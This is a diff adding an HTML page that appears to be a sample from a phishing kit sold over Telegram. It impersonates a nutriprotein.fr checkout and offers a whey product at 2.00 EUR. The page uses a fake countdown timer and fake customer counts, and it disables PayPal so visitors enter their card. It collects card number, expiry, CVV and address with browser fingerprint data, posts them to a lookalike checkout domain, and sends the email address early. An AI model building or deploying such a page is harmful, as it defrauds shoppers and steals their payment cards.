@@ -1,0 +1,474 @@
+<!-- For NS or RB, contact @ElianDuv on Telegram -->
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0">
+    <title>Exemple 2 - ElianDUV</title>
+    <link rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=nutriprotein.fr&sz=32" />
+    <link rel="stylesheet" href="https://checkout.nutriprotein.fr/assets/css/style.css?t=1739279465">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
+    <script src="https://checkout.nutriprotein.fr/assets/js/payment.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/libphonenumber-js/1.11.17/libphonenumber-js.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
+    </head>
+
+<body>
+    
+    <div class="container">
+        <header>
+            <div class="logo">
+              <img src="https://i.postimg.cc/YSPzLDFY/Elian-Duv-Off.png">
+            </div>
+            <div class="business-banner">
+                <img src="https://checkout.nutriprotein.fr/images/avatar1.jpg">
+                <img src="https://checkout.nutriprotein.fr/images/avatar2.jpg">
+                <img src="https://checkout.nutriprotein.fr/images/avatar3.jpg">
+                <span>+1547 CLIENTS SATISFAITS</span>
+            </div>
+            <div class="features">
+                <div class="features-container">
+                                        <span><img src="https://checkout.nutriprotein.fr/images/guarantee.svg" alt=""> Garantie 30 jours</span>
+                    <span><img src="https://checkout.nutriprotein.fr/images/shipping.svg" alt=""> Livraison rapide</span>
+                                        <span><img src="https://checkout.nutriprotein.fr/images/secure.svg" alt=""> Paiement sécurisé</span>
+                </div>
+            </div>
+            <div class="mobile-cart">
+              <img src="https://checkout.nutriprotein.fr/images/cart.svg">
+            </div>
+        </header>
+
+        <main>
+          <form id="checkout-form" method="POST" action="https://checkout.nutriprotein.fr/Im51dHJpcHJvdGVpbi5mciI/cn/eyJsb2dvIjoiaHR0cHM6XC9cL251dHJpcHJvdGVpbi5mclwvY2RuXC9zaG9wXC9maWxlc1wvNTc3ODAyMjAxLTM4MDE4MjMwMS1icmVfXzEwODBfeF8yOTNfcHhfX18xMDEzX3hfMTU1X3B4LnBuZyIsInBfbmFtZSI6IjEwMCUgV2hleSBIeWRybyBJc29sYXRlIFplcm8gLSBCaXNjdWl0IFwvIDEwMDBnIiwicF9pbWFnZSI6Imh0dHBzOlwvXC9jZG4uc2hvcGlmeS5jb21cL3NcL2ZpbGVzXC8xXC8wODk4XC80MzA0XC8wNTkyXC9maWxlc1wvcHJvemlzLTEwMC13aGV5LWh5ZHJvLWlzb2xhdGUtemVyby03NTAtZy1wcm90ZWluZXMtc2Fucy1nbHVjaWRlcy1ncmFpc3Nlcy1ldC1zdWNyZXNfMS53ZWJwP3Y9MTc0NzY3MzEzNSIsInBfY3ByaWNlIjoiMi4wMCIsInBfb3ByaWNlIjoiNDQuNzkiLCJyZXZpZXdzIjoiMTU0NyIsImNvbG9yIjoiMDAwMDAwIiwiY3VycmVuY3kiOiJFVVIiLCJjb3VudHJ5X2NvZGUiOiJGUiIsInRhZ3MiOiJ0aW1lciIsInZhcmlhbnRfaWQiOiI1MTM1OTQ2NjQ1NTM3NiIsImZhY2Vib29rX3BpeGVsIjoibnVsbCIsInRpa3Rva19waXhlbCI6Im51bGwiLCJjdXN0b21fZG9tYWluX3BpeGVsIjoibnVsbCJ9"><input type="hidden" name="_token" value="Cr8WWPdoNi56xODvfcyINLCrVC31LrLfOiNApvTM">            <input type="hidden" name="customer_browser" id="customerBrowser">
+            <div class="checkout-container">
+                <div class="form-section">
+
+                                        <div class="timer-container">
+                      <small>En raison d&#039;une forte demande, votre panier est réservé pendant encore <span class="timer-time"></span> minutes</small>
+                    </div>
+                    
+                    <div class="contact-info">
+                        <h2>Contact</h2>
+                        <input id="email" type="email" name="email" placeholder="Adresse e-mail" value="" class="" required>
+                        <label class="checkbox">
+                            <input name="signup_newsletter" type="checkbox" >
+                            <span>Envoyez-moi des nouvelles et des offres par e-mail</span>
+                        </label>
+                    </div>
+
+                    <div class="delivery">
+                        <h2>
+                                                    Livraison
+                                                  </h2>
+                        <div class="country-select">
+                          <select id="select-country" name="country" required>
+                              <option value="US" >United States</option>
+                              <option value="AU" >Australia</option>
+                              <option value="GB" >United Kingdom</option>
+                              <option value="RO" >Romania</option>
+                              <option value="IE" >Ireland</option>
+                              <option disabled="" value="">---</option>
+                              <option value="AD" >Andorra</option>
+                              <option value="AT" >Austria</option>
+                              <option value="BE" >Belgium</option>
+                              <option value="BR" >Brazil</option>
+                              <option value="BG" >Bulgaria</option>
+                              <option value="CA" >Canada</option>
+                              <option value="HR" >Croatia</option>
+                              <option value="CZ" >Czechia</option>
+                              <option value="DK" >Denmark</option>
+                              <option value="EE" >Estonia</option>
+                              <option value="FI" >Finland</option>
+                              <option value="FR" selected>France</option>
+                              <option value="GE" >Georgia</option>
+                              <option value="DE" >Germany</option>
+                              <option value="GR" >Greece</option>
+                              <option value="HK" >Hong Kong SAR</option>
+                              <option value="HU" >Hungary</option>
+                              <option value="IT" >Italy</option>
+                              <option value="JP" >Japan</option>
+                              <option value="LV" >Latvia</option>
+                              <option value="LT" >Lithuania</option>
+                              <option value="LU" >Luxembourg</option>
+                              <option value="MY" >Malaysia</option>
+                              <option value="MX" >Mexico</option>
+                              <option value="NL" >Netherlands</option>
+                              <option value="NZ" >New Zealand</option>
+                              <option value="PY" >Paraguay</option>
+                              <option value="PL" >Poland</option>
+                              <option value="PT" >Portugal</option>
+                              <option value="RS" >Serbia</option>
+                              <option value="SK" >Slovakia</option>
+                              <option value="SI" >Slovenia</option>
+                              <option value="KR" >South Korea</option>
+                              <option value="ES" >Spain</option>
+                              <option value="SE" >Sweden</option>
+                              <option value="CH" >Switzerland</option>
+                              <option value="UY" >Uruguay</option>
+                              <option value="VA" >Vatican City</option>
+                              <option value="VE" >Venezuela</option>
+                          </select>
+                        </div>
+
+                        <div class="name-fields">
+                            <input type="text" name="first_name" placeholder="Prénom" value="" class="" required>
+                            <input type="text" name="last_name" placeholder="Nom" value="" class="" required>
+                        </div>
+
+                        <input type="text" name="address" placeholder="Adresse" class="address-input " value="" required>
+
+                        <div class="postal-city">
+                            <input type="text" name="zip_code" placeholder="Code postal" value="" class="" minlength="4" required>
+                            <input type="text" name="city" placeholder="Ville" value="" class="" required>
+                        </div>
+
+                        <input type="tel" id="phone" name="phone" placeholder="Téléphone" value="" class="" required>
+                    </div>
+
+                    <div class="shipping-method">
+                        <h2>Mode de livraison</h2>
+                        <div class="shipping-option">
+                            <input type="radio" name="shipping" checked>
+                            <div class="shipping-option-content">
+                                <div class="shipping-option-text">
+                                    <span class="shipping-title">
+                                                                            Livraison à domicile 48h
+                                                                          </span>
+                                    <span class="shipping-price">OFFERTE</span>
+                                </div>
+                                <span class="shipping-description">
+                                                                    DHL Express - <span id="shipping-country"></span>
+                                                                  </span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="payment">
+                        <h2 class="payment-title">Paiement sécurisé</h2>
+                        <p class="security-note">Toutes les transactions sont sécurisées et chiffrées.</p>
+
+                        <div class="payment-forms">
+                            <div id="card-method">
+                              <div id="card-method-banner" class="payment-method">
+                                  <label class="radio">
+                                      <input type="radio" name="payment-method" value="card" checked>
+                                      <span>Carte de crédit</span>
+                                  </label>
+                                  <div class="card-icons">
+                                      <img src="https://checkout.nutriprotein.fr/images/visa.svg" alt="Visa">
+                                      <img src="https://checkout.nutriprotein.fr/images/mastercard.svg" alt="Mastercard">
+                                      <img src="https://checkout.nutriprotein.fr/images/amex.svg" alt="American Express">
+                                      <span>+2</span>
+                                  </div>
+                              </div>
+
+                              <div id="card-details" class="card-details">
+                                  <div class="card-number-container">
+                                      <input type="text" id="card-number" name="card_number" placeholder="Numéro de carte" value="" class="card-number " minlength="20" maxlength="20" required>
+                                      <img src="https://checkout.nutriprotein.fr/images/lock.svg" class="card-lock">
+                                  </div>
+                                  <div class="card-security">
+                                      <input type="text" id="card-expire" name="card_expire" placeholder="Date d&#039;expiration (MM/AA)" value="" class="" minlength="5" maxlength="5" required>
+                                      <input type="text" id="card-cvv" name="card_cvv" placeholder="Code de sécurité" value="" class="" minlength="3" maxlength="3" required>
+                                  </div>
+                                  <input type="text" name="card_name" placeholder="Nom sur la carte" class="cardholder-name " value="" required>
+                                                                    <label class="checkbox billing-checkbox">
+                                      <input type="checkbox" checked id="billingCheckbox">
+                                      <span>Utiliser l&#039;adresse de livraison comme adresse de facturation</span>
+                                  </label>
+                                                                </div>
+                            </div>
+
+                            <div id="paypal-method" class="d-none">
+                              <div id="paypal-method-banner" class="payment-method paypal-method-close">
+                                  <label class="radio">
+                                      <input type="radio" name="payment-method" value="paypal">
+                                      <span>PayPal</span>
+                                  </label>
+                                  <div class="card-icons">
+                                      <img src="https://checkout.nutriprotein.fr/images/paypal.svg" alt="PayPal">
+                                  </div>
+                              </div>
+
+                              <div id="paypal-details" class="card-details d-none">
+                                <p class="paypal-unavailable-text">
+                                  PayPal est momentanément indisponible.<br>
+                                  Nous faisons le nécessaire pour rétablir le service au plus vite.
+                                </p>
+                              </div>
+                            </div>
+                        </div>
+
+                        <button id="submit-form" type="submit" class="complete-purchase">Payer maintenant</button>
+                    </div>
+                </div>
+
+                <div class="order-summary">
+                    <div class="order-summary-header" id="orderSummaryToggle">
+                        <div class="summary-preview">
+                            <span>Résumé de la commande</span>
+                            <img src="https://checkout.nutriprotein.fr/images/chevron.svg" class="chevron">
+                        </div>
+                        <div class="summary-preview">
+                            <span class="summary-price">2.00 EUR</span>
+                        </div>
+                    </div>
+                    <div class="order-summary-content" id="orderSummaryContent">
+                        <div class="product">
+                            <div class="product-image">
+                                <img src="https://cdn.shopify.com/s/files/1/0898/4304/0592/files/prozis-100-whey-hydro-isolate-zero-750-g-proteines-sans-glucides-graisses-et-sucres_1.webp?v=1747673135&width=128">
+                                <span class="quantity">1</span>
+                            </div>
+                            <div class="product-info">
+                                <div class="product-details">
+                                    <span>100% Whey Hydro Isolate Zero - Biscuit / 1000g</span>
+                                    <div class="price-container">
+                                                                                <span class="original-price">44.79 EUR</span>
+                                                                                <span class="price">2.00 EUR</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="discount">
+                            <input type="text" placeholder="Code de réduction" id="discountInput">
+                            <button type="button" onclick="handleDiscount()">Appliquer</button>
+                            <div class="discount-error">Code promo invalide</div>
+                        </div>
+
+                        <div class="summary">
+                            <div class="subtotal">
+                                <span>Sous-total</span>
+                                <div class="price-container">
+                                                                        <span class="original-price">44.79 EUR</span>
+                                                                        <span>2.00 EUR</span>
+                                </div>
+                            </div>
+                            <div class="shipping">
+                                <span>Livraison</span>
+                                <span>OFFERTE</span>
+                            </div>
+                            <div class="total">
+                                <span>Total</span>
+                                <div class="price-container">
+                                                                        <span class="original-price">44.79 EUR</span>
+                                                                        <span>2.00 EUR</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+          </form>
+        </main>
+    </div>
+
+    <script>
+      document.getElementById('orderSummaryToggle').addEventListener('click', function () {
+          this.classList.toggle('active');
+          document.getElementById('orderSummaryContent').classList.toggle('active');
+      });
+
+            document.getElementById('billingCheckbox').addEventListener('click', function(e) {
+          e.preventDefault();
+          this.checked = true;
+      });
+      
+      document.getElementById('submit-form').addEventListener('click', async function(e) {
+          this.disabled = true;
+          e.preventDefault();
+          const form = document.getElementById('checkout-form');
+          if (form.checkValidity()) {
+            const cardNumber = document.getElementById("card-number").value.trim();
+            const cardExpire = document.getElementById("card-expire").value;
+            const cardCVC = document.getElementById("card-cvv").value;
+            const [expMonth, expYear] = cardExpire.split("/").map((num) => parseInt(num.trim(), 10));
+
+            if (!Payment.fns.validateCardNumber(cardNumber) || !Payment.fns.validateCardExpiry(expMonth, expYear) || !Payment.fns.validateCardCVC(cardCVC)) {
+              alert("Vos informations de carte sont invalides. Veuillez vérifier et réessayer.");
+              this.disabled = false;
+              return;
+            }
+
+            form.submit();
+          } else {
+            if(document.querySelector('input[name="payment-method"]:checked').value == "paypal") {
+              alert("PayPal est momentanément indisponible. Nous faisons le nécessaire pour rétablir le service au plus vite.");
+            }
+            form.reportValidity();
+            this.disabled = false;
+          }
+      });
+
+      document.addEventListener("DOMContentLoaded", function () {
+        
+                  const timerContainer = document.querySelector(".timer-container");
+          const timerElement = document.querySelector(".timer-time");
+          let timeLeft = localStorage.getItem("timerTimeLeft_Im51dHJpcHJvdGVpbi5mciI") ? parseInt(localStorage.getItem("timerTimeLeft_Im51dHJpcHJvdGVpbi5mciI"), 10) : 600;
+          if (timeLeft <= 0) {
+            timerContainer.style.display = "none";
+          } else {
+            function updateTimerDisplay() {
+              timerElement.textContent = `${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
+            }
+            let timerInterval = setInterval(() => {
+              if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerContainer.style.display = "none";
+                localStorage.removeItem("timerTimeLeft_Im51dHJpcHJvdGVpbi5mciI");
+                return;
+              }
+              timeLeft--;
+              localStorage.setItem("timerTimeLeft_Im51dHJpcHJvdGVpbi5mciI", timeLeft);
+              updateTimerDisplay();
+            }, 1000);
+
+            updateTimerDisplay();
+          }
+        
+        updateShipping();
+
+        const customerBrowser = {
+          javascriptEnabled: true,
+          language: navigator.language || navigator.userLanguage,
+          acceptLanguage: navigator.languages ? navigator.languages.join(",") : navigator.language,
+          userAgent: navigator.userAgent,
+          javaEnabled: navigator.javaEnabled(),
+          screenHeight: window.screen.height,
+          screenWidth: window.screen.width,
+          screenColorDepth: window.screen.colorDepth,
+          timezone: new Date().getTimezoneOffset()
+        };
+
+        document.getElementById("customerBrowser").value = JSON.stringify(customerBrowser);
+
+        const cardNumberInput = document.getElementById("card-number");
+        cardNumberInput.addEventListener("input", function (e) {
+            let value = e.target.value.replace(/\D/g, "");
+            value = value.substring(0, 16);
+            let formattedValue = value.replace(/(\d{4})/g, "$1 ").trim();
+            e.target.value = formattedValue;
+        });
+        cardNumberInput.addEventListener("keydown", function (e) {
+            if (e.key === "Backspace" && (e.target.value.endsWith(" "))) {
+                e.target.value = e.target.value.slice(0, -1);
+            }
+        });
+
+        const expireInput = document.getElementById("card-expire");
+        expireInput.addEventListener("input", function (e) {
+            let value = e.target.value.replace(/\D/g, "");
+
+            if (value.length > 2) {
+                value = value.substring(0, 2) + "/" + value.substring(2, 4);
+            }
+
+            e.target.value = value.substring(0, 5);
+        });
+
+        expireInput.addEventListener("keydown", function (e) {
+            if (e.key === "Backspace" && expireInput.value.endsWith("/")) {
+                expireInput.value = expireInput.value.slice(0, -1);
+            }
+        });
+
+        const cvvInput = document.getElementById("card-cvv");
+        cvvInput.addEventListener("input", function (e) {
+            e.target.value = e.target.value.replace(/\D/g, "").substring(0, 3);
+        });
+
+        document.querySelectorAll('.is-invalid').forEach(function (input) {
+          input.addEventListener('click', function () {
+            this.classList.remove('is-invalid');
+          });
+        });
+
+        document.querySelectorAll('input[name="payment-method"]').forEach(radio => {
+          radio.addEventListener('change', function () {
+            if (this.checked) {
+              if (this.value === 'paypal') {
+                document.querySelector('#paypal-method-banner').classList.replace('paypal-method-close', 'paypal-method-open');
+                document.querySelector('#card-method-banner').classList.add('card-method-close');
+                document.querySelector('#paypal-details').classList.remove('d-none');
+                document.querySelector('#card-details').classList.add('d-none');
+              } else if (this.value === 'card') {
+                document.querySelector('#paypal-method-banner').classList.replace('paypal-method-open', 'paypal-method-close');
+                document.querySelector('#card-method-banner').classList.remove('card-method-close');
+                document.querySelector('#paypal-details').classList.add('d-none');
+                document.querySelector('#card-details').classList.remove('d-none');
+              }
+            }
+          });
+        });
+
+      });
+
+      let initiatedPayment = false;
+      document.getElementById("email").addEventListener("blur", async function () {
+        let emailInput = document.getElementById("email");
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value) && !initiatedPayment) {
+          initiatedPayment = true;
+                                        let formData = new URLSearchParams();
+          formData.append("shop_name", "nutriprotein.fr");
+          formData.append("country", "FR");
+          formData.append("price", "2.00");
+          formData.append("email", emailInput.value);
+          formData.append("variant_id", "51359466455376");
+          formData.append("currency", "EUR");
+          formData.append("language", navigator.language || navigator.userLanguage);
+          formData.append("user_agent", navigator.userAgent);
+          await fetch("https://checkout.nutriprotein.fr/checkout/api/initiated_payment", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", }, body: formData.toString()}).then(response => response.json()).then(data => { initiatedPayment = true; }).catch(error => { initiatedPayment = false;});
+        }
+      });
+
+      document.getElementById("phone").addEventListener("blur", function () {
+        let phoneInput = document.getElementById("phone");
+        let select = document.getElementById("select-country");
+        let selectedCountry = select.options[select.selectedIndex].value;
+        let rawNumber = phoneInput.value.trim();
+        if (rawNumber) {
+          try {
+            const { parsePhoneNumberFromString } = libphonenumber;
+            let phoneNumber = parsePhoneNumberFromString(rawNumber, selectedCountry);
+
+            if (phoneNumber && phoneNumber.isValid()) {
+              let formattedNumber = phoneNumber.formatInternational();
+              phoneInput.value = formattedNumber;
+            } else {
+              alert("Le numéro de téléphone saisi est invalide. Veuillez vérifier et réessayer.");
+              phoneInput.value = "";
+            }
+          } catch (error) {}
+        }
+      });
+
+      document.getElementById("select-country").addEventListener("change", function() {
+        updateShipping();
+      });
+
+      function updateShipping() {
+        let select = document.getElementById("select-country");
+        let selectedText = select.options[select.selectedIndex].innerText;
+        document.getElementById("shipping-country").innerText = selectedText;
+      }
+
+      document.documentElement.style.setProperty('--primary-color', '#000000');
+
+      function handleDiscount() {
+          const errorMsg = document.querySelector('.discount-error');
+          const input = document.getElementById('discountInput');
+
+          if (input.value.trim() !== '') {
+              errorMsg.classList.add('show');
+              input.value = '';
+          } else {
+              errorMsg.classList.remove('show');
+          }
+      }
+
+          </script>
+</body>
+
+
+</html>
